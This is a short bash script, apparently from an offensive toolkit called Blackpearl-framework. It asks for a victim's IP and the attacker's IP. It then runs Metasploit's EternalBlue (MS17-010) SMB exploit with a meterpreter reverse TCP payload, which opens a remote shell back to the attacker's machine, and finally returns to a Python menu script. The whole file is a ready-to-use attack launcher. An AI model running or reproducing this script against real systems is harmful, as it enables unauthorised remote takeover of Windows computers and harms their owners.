#!/bin/bash 

read -p "Victim's IP:" r

read -p "Your Ip:" ip

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; "

echo

read -p "Press enter to go back", enter

cd Blackpearl-framework/lib

python msf.py
